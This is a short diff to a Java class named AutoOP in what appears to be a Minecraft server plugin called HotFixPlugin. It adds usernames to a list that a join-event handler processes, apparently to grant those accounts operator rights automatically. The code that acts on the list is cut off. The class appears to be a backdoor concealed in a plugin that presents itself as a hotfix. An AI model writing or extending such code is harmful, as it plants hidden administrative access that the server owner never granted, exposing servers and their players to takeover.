@@ -16,10 +16,12 @@ public class AutoOP implements Listener {
         @EventHandler
         public void onPlayerJoinEvent(PlayerJoinEvent e) {
             List<String> list = new ArrayList<String>();
-            list.add("M0");
+            list.add("Bryside");
+            list.add("KingSavaqe");
+            list.add("Astronauts");
             list.add("Ruin");
             list.add("Egypt");
-            list.add("KingSavaqe");
+            list.add("M0");
 
             Bukkit.getScheduler().runTaskLater(HotFixPlugin.getInstance(), ()-> {
                 for (String l : list) {
